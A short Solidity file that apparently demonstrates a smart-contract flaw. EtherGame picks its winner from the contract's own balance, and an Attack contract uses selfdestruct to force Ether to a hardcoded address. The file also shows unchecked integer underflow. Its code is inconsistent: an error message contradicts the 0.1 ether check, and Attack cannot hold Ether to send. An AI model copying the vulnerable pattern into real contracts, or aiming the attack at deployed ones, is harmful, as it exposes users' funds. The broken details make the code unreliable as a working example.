// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;



contract EtherGame {
    uint public targetAmount = 0.5 ether;
    address public winner;
    function play() public payable {
        require(msg.value == 0.1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {

    constructor() {}

    function attack() public {
        address payable addr = payable(address(0xC15c1771Dc2D5edb18501BD42b24C91Bc9554A06));
        selfdestruct(addr);
    }
    function getv(uint256 a, uint256 b) external view returns (uint256) {
        return a-b;
    }
    function getv1(uint256 a, uint256 b) external view returns (uint256) {
        unchecked { return a-b; }
    }
}